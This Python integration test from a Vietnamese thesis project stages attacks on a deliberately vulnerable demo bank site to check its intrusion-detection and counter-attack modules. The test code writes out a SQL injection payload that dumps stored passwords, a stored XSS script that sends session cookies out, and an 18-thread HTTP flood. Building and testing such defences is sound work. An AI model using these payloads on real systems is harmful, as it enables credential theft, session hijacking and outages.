"""
test_end_to_end.py - Kiểm thử tích hợp toàn diện mô phỏng 2 Máy (Attacker & Victim) + Hội đồng (Ngrok)
Kiểm chứng đầy đủ 8 kịch bản thực tế trước Hội đồng bảo vệ đồ án:
1. Hội đồng mở tài khoản mới (username có dấu gạch dưới) -> Cookie đăng nhập & Sao kê hiển thị đúng tên Thầy/Cô.
2. Kiểm tra chống dương tính giả NIDS: Người dùng đăng nhập mật khẩu có ký tự '#' hoặc gửi góp ý bình thường -> 0 cảnh báo giả.
3. Kịch bản SQLi: Lấy ngay tài khoản Hội đồng vừa tạo (is_new=True) + NIDS bắt trúng gói tin SQLi trên Card mạng.
4. Kịch bản Stored XSS: Tiêm script -> Hội đồng truy cập qua Ngrok (X-Forwarded-For IP thật) -> Cướp Cookie phiên thành công + NIDS bắt trúng XSS.
5. Kịch bản DoS: Dội tải làm sập Web Server -> Hội đồng vào trang chủ nhận mã 503 Service Unavailable + NIDS bắt trúng DoS HTTP Flood.
6. Phản đòn HIPS 4 chế độ (Block, TCP RST, Tarpit, Honeypot):
   - Honeypot trả về CSDL Canary giả mạo cho IP Attacker nhưng không ảnh hưởng người khác.
   - TCP RST cắt đứt tức thì kết nối của IP Attacker (RemoteDisconnected), đồng thời Hội đồng vào lại Web 200 OK ngay lập tức!
7. Reset Server: Xóa sạch bình luận độc hại XSS, mở khóa IP, khôi phục trạng thái an toàn 100%.
"""
import sys
import time
import socket
import threading
import urllib.request
import urllib.parse
import urllib.error
import http.cookiejar
import json
from pathlib import Path

BASE_DIR = Path(__file__).resolve().parent.parent
sys.path.insert(0, str(BASE_DIR))

from part3_webserver.server import app
from part2_defense.nids_engine import NIDSEngine
import part2_defense.hips_guard as hips_mod
from part2_defense.hips_guard import HIPSGuard

TEST_PORT = 8089
hips_mod.WEB_SERVER_URL = f"http://127.0.0.1:{TEST_PORT}"

# Tìm IP LAN thật của máy để giả lập kết nối mạng 2 máy
def get_lan_ip():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except Exception:
        return "127.0.0.1"

LAN_IP = get_lan_ip()
VICTIM_LAN_URL = f"http://{LAN_IP}:{TEST_PORT}"
LOCAL_URL = f"http://127.0.0.1:{TEST_PORT}"

captured_alerts = []
nids = NIDSEngine(interface="ALL", target_port=TEST_PORT, on_alert_cb=lambda a: captured_alerts.append(a))
hips = HIPSGuard(auto_block=False)

# Khởi chạy Web Server (0.0.0.0) & NIDS Sniffer thật
threading.Thread(
    target=lambda: app.run(host="0.0.0.0", port=TEST_PORT, debug=False, threaded=True, use_reloader=False),
    daemon=True
).start()
threading.Thread(target=nids.start_sniffing, daemon=True).start()
time.sleep(1.8)

print(f"[*] Đang kiểm thử trên LAN URL: {VICTIM_LAN_URL} (Council qua Ngrok X-Forwarded-For: 171.244.99.88)")

# ==============================================================================
# 1. HỘI ĐỒNG ĐĂNG KÝ TÀI KHOẢN (CÓ DẤU GẠCH DƯỚI) & KIỂM TRA PHIÊN ĐĂNG NHẬP
# ==============================================================================
cj = http.cookiejar.CookieJar()
council_opener = urllib.request.build_opener(urllib.request.HTTPCookieProcessor(cj))
council_opener.addheaders = [
    ("User-Agent", "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X)"),
    ("X-Forwarded-For", "171.244.99.88"),
    ("Accept", "text/html,application/xhtml+xml")
]

reg_data = urllib.parse.urlencode({
    "full_name": "TS. Nguyễn Văn A - Hội Đồng",
    "username": "thay_phan_bien_01",
    "password": "Password#123!",
    "role": "Ủy Viên Phản Biện"
}).encode("utf-8")

resp_reg = council_opener.open(f"{LOCAL_URL}/register", data=reg_data)
home_html = resp_reg.read().decode("utf-8")
assert resp_reg.status == 200
assert "TS. Nguyễn Văn A - Hội Đồng" in home_html
assert "● ĐÃ KÍCH HOẠT" in home_html, "Lỗi: Đăng ký username có dấu '_' không tự động đăng nhập được!"

stmt_html = council_opener.open(f"{LOCAL_URL}/service/statement").read().decode("utf-8")
assert "TS. Nguyễn Văn A - Hội Đồng" in stmt_html and "$500,000" in stmt_html
print("[✓] Test 1 PASSED: Hội đồng tạo tài khoản 'thay_phan_bien_01' (mật khẩu có '#'), giữ phiên & sao kê chuẩn xác!")

# Gửi góp ý bình thường từ trình duyệt Hội đồng -> Phải redirect về trang chủ, 0 cảnh báo giả NIDS
normal_cmt = urllib.parse.urlencode({
    "author": "TS. Nguyễn Văn A",
    "content": "Giao diện ngân hàng số #1 rất trực quan -- tốc độ tốt!"
}).encode("utf-8")
resp_cmt = council_opener.open(f"{LOCAL_URL}/api/comment", data=normal_cmt)
assert resp_cmt.status == 200 and "DIGIBANK" in resp_cmt.read().decode("utf-8")
time.sleep(0.5)
assert len(captured_alerts) == 0, f"Lỗi dương tính giả NIDS trên thao tác bình thường: {captured_alerts}"
print("[✓] Test 2 PASSED: Chống dương tính giả 100% (Mật khẩu có '#', góp ý có '--' không bị báo nhầm SQLi)!")

# ==============================================================================
# 2. MÁY TẤN CÔNG KHAI THÁC SQL INJECTION QUA IP LAN MÁY CHỦ
# ==============================================================================
sqli_q = urllib.parse.quote("' UNION SELECT id, username, password, full_name, role, balance FROM users --")
req_sqli = urllib.request.Request(
    f"{VICTIM_LAN_URL}/api/login?user={sqli_q}&pass=any",
    headers={"User-Agent": "Attacker-SQLi/3.0", "X-Forwarded-For": "192.168.88.250"}
)
with urllib.request.urlopen(req_sqli) as r:
    data = json.loads(r.read().decode("utf-8"))
    leaked = data.get("leaked_database", [])
    new_acc = [u for u in leaked if u.get("username") == "thay_phan_bien_01"]
    assert len(new_acc) == 1 and new_acc[0]["is_new"] is True
    assert new_acc[0]["password"] == "Password#123!"

time.sleep(0.6)
assert any("SQL Injection" in a["category"] for a in captured_alerts), "NIDS không bắt được gói tin SQLi!"
print(f"[✓] Test 3 PASSED: SQLi lấy ngay tài khoản Hội đồng vừa tạo ({new_acc[0]['username']}) & NIDS báo động đỏ!")

# ==============================================================================
# 3. MÁY TẤN CÔNG TIÊM STORED XSS & CƯỚP COOKIE HỘI ĐỒNG QUA NGROK IP THẬT
# ==============================================================================
xss_payload = "<script>fetch('/api/xss/exfiltrate?cookie='+encodeURIComponent(document.cookie));</script>"
req_xss = urllib.request.Request(
    f"{VICTIM_LAN_URL}/api/comment?author=RedTeam&content={urllib.parse.quote(xss_payload)}",
    headers={"User-Agent": "Attacker-XSS/3.0", "X-Forwarded-For": "192.168.88.250"}
)
with urllib.request.urlopen(req_xss) as r:
    assert json.loads(r.read().decode("utf-8")).get("status") == "PWNED"

time.sleep(0.6)
assert any("XSS" in a["category"] for a in captured_alerts), "NIDS không bắt được gói tin XSS!"

# Mô phỏng trình duyệt Hội đồng (IP 4G: 171.244.99.88) kích hoạt script gửi Cookie về
council_cookie_val = "; ".join(f"{c.name}={c.value}" for c in cj)
council_opener.open(f"{LOCAL_URL}/api/xss/exfiltrate?cookie={urllib.parse.quote(council_cookie_val)}")

with urllib.request.urlopen(f"{VICTIM_LAN_URL}/api/xss/stolen_cookies") as r:
    stolen = json.loads(r.read().decode("utf-8")).get("stolen_cookies", [])
    assert any(c["victim_ip"] == "171.244.99.88" and "SEC_TOKEN_thay_phan_bien_01" in c["cookie"] for c in stolen)
print(f"[✓] Test 4 PASSED: Stored XSS cướp đúng Cookie & IP 4G thật của Hội đồng ({stolen[0]['victim_ip']})!")

# ==============================================================================
# 4. PHẢN ĐÒN HONEYPOT (ĐÒN 4) - CÔ LẬP KẺ TẤN CÔNG VÀO CSDL ẢO CANARY
# ==============================================================================
ok_hp, _ = hips.counter_attack_honeypot("192.168.88.250")
assert ok_hp
with urllib.request.urlopen(req_sqli) as r:
    hp_data = json.loads(r.read().decode("utf-8"))
    assert hp_data.get("is_honeypot") is True
    assert hp_data["leaked_database"][0]["username"] == "honey_trap_root"
hips.unblock_ip("192.168.88.250")
print("[✓] Test 5 PASSED: Phản đòn 4 (Honeypot) đánh lừa Attacker nhận CSDL Canary giả mạo!")

# ==============================================================================
# 5. DỘI TẢI DoS LÀM SẬP WEB 503 TRÊN MÁY HỘI ĐỒNG -> PHẢN ĐÒN TCP RST / BLOCK CỨU WEB!
# ==============================================================================
stop_dos = threading.Event()
dos_503_count = 0

def _dos_flood():
    global dos_503_count
    while not stop_dos.is_set():
        try:
            req = urllib.request.Request(
                f"{VICTIM_LAN_URL}/api/search?q=flood",
                headers={"User-Agent": "DoS-Attacker/3.0", "X-Forwarded-For": "192.168.88.250"}
            )
            urllib.request.urlopen(req, timeout=1.2)
        except urllib.error.HTTPError as e:
            if e.code == 503:
                dos_503_count += 1
        except Exception:
            pass
        time.sleep(0.03)

dos_threads = [threading.Thread(target=_dos_flood, daemon=True) for _ in range(18)]
for t in dos_threads:
    t.start()

time.sleep(1.2)

# Trong lúc Attacker đang dội DoS -> Hội đồng bấm vào trang chủ phải thấy lỗi 503!
council_got_503 = False
try:
    council_opener.open(f"{LOCAL_URL}/", timeout=2.0)
except urllib.error.HTTPError as e:
    if e.code == 503:
        council_got_503 = True

assert council_got_503, "Hội đồng không thấy lỗi 503 khi Web đang bị dội DoS!"
assert any("DoS" in a["category"] for a in captured_alerts), "NIDS không phát hiện được DoS Flood!"
print(f"[✓] Test 6 PASSED: Khi DoS tấn công, Hội đồng thao tác trên web lập tức bị sập 503 & NIDS cảnh báo DoS!")

# Bây giờ HIPS tung Đòn Phản Công (TCP RST / Block) khóa IP 192.168.88.250 NGAY TRONG LÚC ĐANG DoS!
hips.counter_attack_tcp_rst("192.168.88.250", target_port=TEST_PORT)

# Kiểm chứng Attacker bị ngắt kết nối ngay lập tức
attacker_blocked = False
try:
    urllib.request.urlopen(req_sqli, timeout=1.5)
except Exception:
    attacker_blocked = True
assert attacker_blocked, "Attacker vẫn kết nối được sau khi bị HIPS bắn TCP RST!"

# Đợi ~2.1s cho 6 luồng cũ giải phóng xong -> Hội đồng F5 lại trang web PHẢI VÀO BÌNH THƯỜNG 200 OK (dù DoS vẫn đang bắn!)
time.sleep(2.2)
resp_recovered = council_opener.open(f"{LOCAL_URL}/", timeout=2.5)
assert resp_recovered.status == 200, f"Web không tự hồi phục cho Hội đồng sau khi chặn Attacker! Status: {resp_recovered.status}"
stop_dos.set()
print("[✓] Test 7 PASSED: Ngay khi HIPS phản đòn khóa IP Attacker, Attacker bị đánh sập kết nối và Hội đồng lập tức dùng lại Web bình thường (200 OK)!")

# ==============================================================================
# 6. KIỂM TRA RESET SERVER DỌN SẠCH MÃ ĐỘC XSS & MỞ KHÓA AN TOÀN
# ==============================================================================
urllib.request.urlopen(f"{LOCAL_URL}/api/reset")
hips.unblock_ip("192.168.88.250")
clean_home = council_opener.open(f"{LOCAL_URL}/").read().decode("utf-8")
assert "<script>fetch('/api/xss/exfiltrate" not in clean_home, "Reset Server chưa dọn sạch mã độc Stored XSS!"
nids.stop()
print("[✓] Test 8 PASSED: Reset Server dọn sạch mã độc XSS, xóa Cookie rò rỉ và khôi phục hệ thống 100%!")

print("\n======================================================================")
print("🏆 TOÀN BỘ 8 KỊCH BẢN TRIỂN KHAI 2 MÁY + HỘI ĐỒNG NGROK ĐẠT 100% PASS!")
print("======================================================================")
